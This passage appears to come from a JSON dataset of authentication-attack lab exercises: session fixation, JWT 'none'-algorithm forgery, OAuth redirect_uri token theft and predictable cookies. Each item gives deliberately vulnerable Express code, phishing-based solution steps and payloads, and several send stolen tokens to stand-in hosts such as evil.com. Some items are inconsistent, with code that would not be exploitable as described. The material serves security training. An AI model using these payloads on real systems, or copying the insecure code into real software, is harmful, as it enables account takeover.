          "Observe that the Referer header in the request to evil.net leaks access_token",
          "Visit the OAuth flow link again in browser with Intercept off to trigger Referer leak",
          "Send the leaked access token in Authorization header via Postman to GET /my-account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth-callback', (req, res) => { const html = `<html><head><script src=\"https://evil.net/track.js\"></script></head><body>OAuth Complete</body></html>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123token') res.send('Carlos account page'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "GET https://evil.net/track.js Referer: https://target.com/oauth-callback#access_token=abc123token",
          "Authorization: Bearer abc123token"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session tokens in login response",
        "Lab Description": "The application sets a session cookie in a GET /set-session endpoint before login. The token is reused after successful login without regeneration. An attacker can fix a session ID and force the victim to authenticate within it. To solve: fix a session ID and log in as Carlos within that session to hijack the login state.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to send GET /set-session and observe that a predictable session cookie is returned",
          "Send the fixed session cookie link to the victim using social engineering",
          "Once victim logs in, the attacker reuses the same cookie to access /my-account",
          "Send GET request to /my-account using the fixed cookie to hijack the session",
          "Confirm access to Carlos’s account via session reuse"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/set-session', (req, res) => { const sessionId = 'fixed-session-id'; res.cookie('session', sessionId); sessions[sessionId] = { username: null }; res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sessionId]) { sessions[sessionId].username = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.username === 'carlos') res.send('Carlos account'); else res.status(401).send('Access denied'); }); app.listen(5000);",
        "payloads": [
          "GET /set-session => Cookie: session=fixed-session-id",
          "POST /login => Cookie: session=fixed-session-id, Body: username=carlos&password=pass123",
          "GET /my-account => Cookie: session=fixed-session-id"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The login mechanism fails to assign a new session token after authentication. The application reuses the session token set prior to login. To solve: fixate a session for the victim user, log them in using social engineering or automation, then access their account.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "1. Intercept the GET /login request using Burp Suite to retrieve a valid session cookie before authentication.",
          "2. Send the session cookie to the victim using a phishing link that embeds the session value in a URL (e.g., http://vulnerable-app.com/login?session=abcd1234).",
          "3. Wait for the victim to log in, which causes the reused session to become authenticated.",
          "4. Reuse the same session cookie in your browser and navigate to /my-account.",
          "5. Confirm successful session hijacking and data access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'insecuresecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send('Welcome, ' + req.session.username); else res.status(401).send('Please log in.'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "http://vulnerable-app.com/login?session=abcd1234",
          "Set-Cookie: connect.sid=abcd1234; Path=/; HttpOnly",
          "Reuse stolen cookie: abcd1234 in victim’s browser"
        ]
      },
      {
        "Lab scenario": "JWT tampering via algorithm confusion vulnerability in token validation",
        "Lab Description": "The server accepts and trusts JWTs with the `alg` header set to `none`, allowing unsigned tokens to be accepted. The application trusts the payload without validating its integrity. To solve: craft a forged JWT token impersonating Carlos and use it to access /my-account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture a legitimate JWT token from an authenticated request using OWASP ZAP or Burp Suite.",
          "2. Decode the JWT token using jwt.io or a script and analyze the payload and header.",
          "3. Modify the `alg` field to `none`, set `username` to `carlos`, and remove the signature part.",
          "4. Replace the JWT token in the Authorization header with the forged one.",
          "5. Send the request to /my-account and confirm access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { res.send('Welcome, ' + payload.payload.username); } else { try { const verified = jwt.verify(token, 'jwt-secret'); res.send('Welcome, ' + verified.username); } catch (e) { res.sendStatus(403); } } }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer <forged-token>",
          "{\"alg\":\"none\"} + {\"username\":\"carlos\"}"
        ]
      },
      {
        "Lab scenario": "OAuth token manipulation in third-party login integration",
        "Lab Description": "The application integrates with an OAuth provider but does not properly validate the `access_token` or `id_token` audience and issuer. It only parses the token payload to extract the email. To solve: forge a valid-looking token for Carlos with a fake OAuth issuer and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to observe the OAuth login flow and inspect the structure of a valid `id_token` (JWT).",
          "2. Craft a fake token using jwt.io with `email: carlos@example.com` and a spoofed `iss` (issuer).",
          "3. Set `alg` to `HS256` and sign it with a self-chosen key, e.g., 'fake-oauth-key'.",
          "4. Intercept the OAuth callback request in Burp and replace the real token with the forged one.",
          "5. Replay the modified request to the OAuth callback endpoint and confirm login as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const { id_token } = req.body; try { const payload = jwt.decode(id_token);  const email = payload.email; if (email === 'carlos@example.com') { res.send('Welcome back, Carlos!'); } else { res.send('Logged in as ' + email); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(5000, () => console.log('OAuth Token Manipulation Lab running on port 5000'));",
        "payloads": [
          "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSIsImlzcyI6Imh0dHBzOi8vZmFrZW9hdXRoLmNvbS8ifQ==.<HMAC-signature>",
          "id_token=forged.jwt.token",
          "Header: {\"alg\":\"HS256\"} + Payload: {\"email\":\"carlos@example.com\"} + Signed with key 'fake-oauth-key'"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow",
        "Lab Description": "This lab’s login mechanism is vulnerable to session fixation. The application does not assign a new session identifier upon successful login. As a result, an attacker can set a session ID before login and reuse it. To solve the lab, gain access to Carlos's account using a pre-established session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET request to /login and capture the Set-Cookie header with the session ID.",
          "Send a crafted phishing link with this session ID embedded in the URL as a cookie to the victim.",
          "Once the victim logs in, re-use the same session ID by setting it manually in your browser using the EditThisCookie extension or Burp.",
          "Navigate to /my-account with the fixed session cookie still valid.",
          "Verify account takeover by viewing Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', Math.random().toString(36).substring(7)); res.send('<form method=\"POST\">...</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { console.log('Session ID retained:', req.cookies.sessionid); res.redirect('/my-account'); } else res.send('Invalid login'); }); app.get('/my-account', (req, res) => res.send('Carlos account page')); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
        "payloads": [
          "sessionid=attackerSession123",
          "Cookie: sessionid=attackerSession123",
          "Phishing URL: http://target.com/login; cookie=sessionid=attackerSession123"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "The application uses JWT for authentication but fails to validate the token signature algorithm correctly. If the algorithm is changed to 'none', the server accepts the token as valid without verification. To solve the lab, forge a valid JWT for Carlos and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept the JWT token issued after login using Burp or Postman.",
          "Copy the token and decode it using jwt.io or a Python script.",
          "Modify the payload to change the username to 'carlos'. In the header, set the alg value to 'none'.",
          "Remove the signature section of the token entirely.",
          "Send the forged token in the Authorization header and request /my-account.",
          "Verify access by reading Carlos’s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.username}`); } catch (e) { console.error('JWT error:', e.message); res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algo Lab running on port ${PORT}`));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Final JWT: base64(header).base64(payload). (no signature)",
          "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation",
        "Lab Description": "The OAuth implementation accepts arbitrary redirect URIs without proper whitelisting, allowing an attacker to intercept tokens. This can be abused to steal Carlos's OAuth access token. To solve the lab, leak his token and use it to access his account data.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a malicious redirect URI (e.g., http://evil.com/callback).",
          "Craft a login link with the OAuth flow, replacing the redirect_uri with your attacker site.",
          "Send the malicious link to Carlos and wait for the redirection with his token.",
          "Extract the access token from your server logs or query string.",
          "Replay the token via Postman or Burp to access /my-account with Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Math.random().toString(36).substring(2); tokens[user] = token; console.log('Generated token:', token); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.keys(tokens).find(k => tokens[k] === token); if (user) res.send(`Welcome to ${user}'s account`); else res.status(401).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on port ${PORT}`));",
        "payloads": [
          "https://target.com/auth?redirect_uri=http://evil.com/callback&user=carlos",
          "Malicious site receives: http://evil.com/callback#access_token=abcd123",
          "Authorization: Bearer abcd123"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
      
        "Lab Description": "The application does not invalidate or regenerate the session ID upon successful login. This enables an attacker to fix a session for a victim prior to authentication. The application reuses existing session tokens across user privilege states. To solve: Hijack Carlos's session after setting it yourself and gaining access to /my-account.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "1. Use Burp Suite to intercept a login request. Observe that session cookies (e.g., `sessionId`) remain unchanged before and after login.",
          "2. Use Burp to register/login as your own user and capture your session cookie.",
          "3. Send a crafted phishing link to Carlos that forces him to log in while using your attacker-controlled session ID (`sessionId=attacker-session`).",
          "4. After Carlos logs in, use the same `sessionId=attacker-session` to access `/my-account`.",
          "5. Confirm the session hijack by verifying access to Carlos’s account page."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secure123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.redirect('/login'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      
        "payloads": [
          "sessionId=attacker-session",
          "Set-Cookie: sessionId=attacker-session",
          "URL with attacker session: http://example.com/login?sessionId=attacker-session"
        ]
      },
      {
        "Lab scenario": "JWT tampering via 'none' algorithm in token verification",
      
        "Lab Description": "The application accepts JWT tokens for authentication and does not properly enforce algorithm constraints. It accepts unsigned tokens by trusting the 'none' algorithm. To solve: Modify your token to impersonate Carlos and access his account page.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "1. Use Postman to log in and capture the issued JWT from the Authorization header.",
          "2. Decode the token on jwt.io and modify the payload to { \"username\": \"carlos\" }.",
          "3. Set the header to { \"alg\": \"none\" } and remove the signature section completely.",
          "4. Send a new request to /my-account using the manipulated token in the Authorization header.",
          "5. Verify access to Carlos's account without needing a valid signature."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'jwt-secret'); res.json({ token }); } else res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
      
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: base64(header).base64(payload).",
          "Authorization: Bearer <tampered-token>"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
      
        "Lab Description": "The application improperly validates redirect URIs during OAuth flows, allowing an attacker to redirect tokens to arbitrary domains. The `redirect_uri` parameter is partially whitelisted, but allows open redirects via parameter manipulation. To solve: Steal Carlos’s OAuth token and access his protected resources.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "1. Use Burp Suite to intercept an OAuth login flow request. Identify the `redirect_uri` parameter.",
          "2. Modify the `redirect_uri` to include a trusted prefix plus `@attacker.com` to bypass validation (e.g., `https://trusted.com@evil.com/oauth`)",
          "3. Host a page on attacker.com to log query strings or fragments (e.g., with `?code=xyz`).",
          "4. Send Carlos a phishing link containing the modified redirect URI.",
          "5. When Carlos logs in, his token is sent to your malicious endpoint. Use this code to retrieve a full access token via Postman.",
          "6. Use the stolen token to call `/my-account` as Carlos."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}?code=${token}`); }); app.get('/my-account', (req, res) => { const { token } = req.query; if (token === 'access-token-for-carlos') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
      
        "payloads": [
          "redirect_uri=https://trusted.com@evil.com/capture",
          "Phishing link: https://example.com/oauth?redirect_uri=https://trusted.com@evil.com/capture",
          "Captured Code: code=access-token-for-carlos",
          "Token reuse: /my-account?token=access-token-for-carlos"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm in login token verification",
        "Lab Description": "This lab's login system is vulnerable due to insecure JWT handling. The application accepts the 'alg' value from the header without verification. An attacker can tamper with the token's payload and set the 'alg' to 'none' to forge authentication. To solve: forge a valid JWT for user 'carlos' and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a login request and capture the JWT token from the Set-Cookie response header.",
          "2. Decode the JWT using jwt.io or Postman. Note the structure and content of the payload and header.",
          "3. Modify the payload to {\"username\":\"carlos\"} and change the header to {\"alg\":\"none\"}. Remove the signature part.",
          "4. Reconstruct the JWT with base64-encoded header and payload separated by a dot ('.') and omit the signature.",
          "5. Use Burp or Postman to replace your JWT cookie with the forged one. Refresh the browser or resend a request to /my-account to verify success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecretkey'; app.get('/my-account', (req, res) => { const token = req.cookies.token; const user = jwt.verify(token, secret); if (user && user.username === 'carlos') { res.send('Access granted to Carlos account'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
        ]
      },
      {
        "Lab scenario": "Session fixation in session ID issued on login via Set-Cookie header",
        "Lab Description": "This application allows session fixation through predictable session tokens. The server issues session IDs in a predictable manner and does not regenerate them after successful login. To solve: fix a session ID for 'carlos' before he logs in, and then reuse it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to register a new account and observe the session cookie named 'sid' in the Set-Cookie response header.",
          "2. Note that session IDs are sequential or time-based (e.g., sid=USER12345). Guess a session ID one step ahead.",
          "3. Send a crafted phishing request to Carlos with the session ID you fixed (e.g., sid=USER12346).",
          "4. Once Carlos logs in, that session ID will be authenticated to his account.",
          "5. Reuse the fixed session cookie (sid=USER12346) in your browser and navigate to /my-account to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; const sessions = {}; let counter = 1000; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = 'USER' + counter++; sessions[sid] = username; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') { res.send('Welcome to Carlos account'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
        "payloads": [
          "sid=USER12346",
          "sid=USER1002",
          "sid=USER1001"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
        "Lab Description": "This lab demonstrates an OAuth 2.0 misconfiguration where the `redirect_uri` parameter is insufficiently validated, allowing attackers to steal authorization codes. To solve: capture a valid OAuth code for 'carlos' using a malicious redirect URI and exchange it for a token to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Identify the authorization request URL using Burp (e.g., /auth?client_id=xyz&redirect_uri=https://site.com/callback).",
          "2. Modify the redirect_uri to point to your own domain (https://evil.com/code-stealer) while preserving the hostname prefix.",
          "3. Host a listener on https://evil.com/code-stealer to capture the authorization code via query parameter.",
          "4. Phish the victim into clicking the crafted OAuth URL. After login, the code is sent to your redirect URI.",
          "5. Use Postman to POST the captured code to /oauth/token endpoint with the client credentials to obtain an access token.",
          "6. Add the token to the Authorization header and send a GET request to /my-account to access Carlos's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect'); const authCode = 'oauth-carlos-code'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'oauth-carlos-code') { res.json({ access_token: 'token-carlos-123' }); } else { res.status(403).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Redirect Lab running on http://localhost:' + PORT));",
        "payloads": [
          "https://attacker.com/code-stealer?code=oauth-carlos-code",
          "https://evil.com/callback?code=oauth-carlos-code",
          "Authorization: Bearer token-carlos-123"
        ]
      },
      {
        "Lab scenario": "Session Fixation in login flow",
        "Lab Description": "The application improperly handles session tokens during login. Instead of rotating the session ID after authentication, it preserves the existing token. The application allows an attacker to fix a session ID before the victim logs in. To solve: hijack Carlos's session using a fixed session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to capture a valid unauthenticated session cookie from /login",
          "Send a crafted phishing link to Carlos with the fixed session ID in the Cookie header",
          "Wait for Carlos to log in with the fixed session (simulate via Burp's manual login replay)",
          "Use the same session ID in your browser to gain access to Carlos's session",
          "Visit /my-account using the fixed session and confirm access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" type=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: connect.sid=sess:12345abcde;",
          "Phishing URL sent with fixed cookie set in request"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm bypass in access tokens",
        "Lab Description": "The application uses JWT tokens for authorization but does not properly verify the signing algorithm. By setting the algorithm to 'none', attackers can forge valid tokens without the secret key. To solve: access Carlos's account page using a tampered JWT.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture the Authorization header after logging in",
          "Decode the JWT using jwt.io or Burp Decoder",
          "Craft a new token with {\"alg\": \"none\"} in the header and \"username\": \"carlos\" in the payload",
          "Sign the JWT without a signature section (empty after last dot)",
          "Replace the original token with the forged one and send a request to /my-account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwt123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); res.send(`Welcome, ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [tampered_token]"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in callback URL",
        "Lab Description": "The OAuth implementation fails to properly validate redirect URIs. Attackers can inject arbitrary URLs to steal authorization codes or tokens. To solve: hijack Carlos’s OAuth flow by injecting a malicious redirect URI to capture his access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to send a GET request to the OAuth login endpoint with a crafted redirect_uri parameter pointing to your malicious domain",
          "Simulate Carlos clicking the malicious login URL (use a temporary redirect server or Burp Collaborator)",
          "Intercept the code/token from the query string after OAuth provider redirects to your malicious domain",
          "Exchange the code/token for user data using the OAuth provider’s token endpoint",
          "Access the protected /my-account resource using the stolen token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Manipulation Lab running'));",
        "payloads": [
          "https://victim-app.com/auth?redirect_uri=https://evil.com/callback",
          "https://oauth-provider.com/auth?client_id=abc&redirect_uri=https://evil.com/callback&response_type=code"
        ]
      },
      {
        "Lab scenario": "Stay logged in cookie brute-force vulnerability in login mechanism",
        "Lab Description": "The application's 'Stay logged in' feature uses a predictable session cookie format. Upon successful login, the server issues a persistent cookie without strong randomness or HMAC validation. To solve: Brute-force a valid session cookie to impersonate Carlos and access his account page.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "1. Use Burp Suite to log in with your own account and inspect the 'stay-logged-in' cookie format in the response.",
          "2. Observe that the cookie format is 'username:timestamp' without encryption or HMAC.",
          "3. Generate cookie variations for username 'carlos' with valid timestamps from recent login attempts using a script or Burp Intruder.",
          "4. Replace your cookie with the brute-forced 'carlos' variant in the browser using Burp Proxy or browser DevTools.",
          "5. Navigate to /my-account to confirm successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password, stayLoggedIn } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (stayLoggedIn) { const cookie = `${username}:${Date.now()}`; res.cookie('stay-logged-in', cookie); } res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const cookie = req.cookies['stay-logged-in']; if (cookie && cookie.startsWith('carlos')) { return res.send('Carlos Account Page'); } res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Stay Logged In Cookie Brute-force Lab running on port 4000'));",
        "payloads": [
          "carlos:1714725000000",
          "carlos:1714725050000",
          "carlos:1714725100000"
        ]
      },
      {
        "Lab scenario": "JWT signature validation bypass via 'none' algorithm in authentication token",
        "Lab Description": "The application uses JWT for session management but fails to properly validate the token signature when the 'alg' field is set to 'none'. To solve: Forge a valid-looking token granting admin access and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman or Burp Suite to log in and capture the JWT token issued in the Authorization header.",
          "2. Decode the token using jwt.io and inspect the 'alg' and 'sub' claims.",
          "3. Modify the 'alg' header to 'none' and change the 'sub' claim to 'admin'.",
          "4. Reconstruct the token without a signature using jwt.io or a script.",
          "5. Use the forged token in the Authorization header and access /admin to confirm privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.sub === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "{\"alg\":\"none\"}.{\"sub\":\"admin\"}.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
        ]
      },
      {
        "Lab scenario": "OAuth authorization code interception in redirect_uri misconfiguration",
        "Lab Description": "The application uses OAuth for login, but the redirect_uri parameter is not properly validated, allowing attackers to intercept authorization codes. To solve: Intercept an authorization code for Carlos by injecting your own redirect URI and gain access to their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth flow and observe the authorization URL with client_id and redirect_uri parameters.",
          "2. Modify the redirect_uri to point to your server (e.g. https://attacker.com/callback) and capture the intercepted code.",
          "3. On your server, listen for the callback and extract the authorization code from the query string.",
          "4. Use Postman to send a POST request to the token endpoint with the stolen code, client_id, and malicious redirect_uri.",
          "5. Use the obtained access_token to retrieve Carlos's profile data via the /me endpoint and confirm lab success."
        ],
        "Vulnerability name": "Authentication",
